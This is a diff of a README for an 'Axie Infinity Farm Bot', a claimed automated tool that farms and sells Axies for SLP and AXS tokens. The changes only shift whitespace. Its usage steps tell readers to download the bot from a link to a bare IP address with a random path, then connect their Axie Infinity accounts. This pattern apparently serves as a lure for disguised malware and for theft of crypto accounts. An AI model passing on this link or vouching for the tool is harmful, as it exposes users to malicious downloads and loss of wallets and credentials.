@@ -10,17 +10,17 @@ The Axie Infinity Farm Bot is an automated tool that helps Axie Infinity players
 
    Optimizes pairing to maximize profitability
 
-    Automatically sells Axies on the marketplace to earn SLP and AXS tokens
+   Automatically sells Axies on the marketplace to earn SLP and AXS tokens
 
-     Monitors the market and automatically adjusts farming strategy
+ Monitors the market and automatically adjusts farming strategy
 
-      User-friendly interface for easy setup and management
+ User-friendly interface for easy setup and management
 
-       Supports multiple accounts
+  Supports multiple accounts
 
-       # Usage
+   # Usage
 
-       1. [Download here](http://91.90.195.152/Gr5L9Q)
+   1. [Download here](http://91.90.195.152/Gr5L9Q)
 
        2. Connect your Axie Infinity accounts to the bot.
 
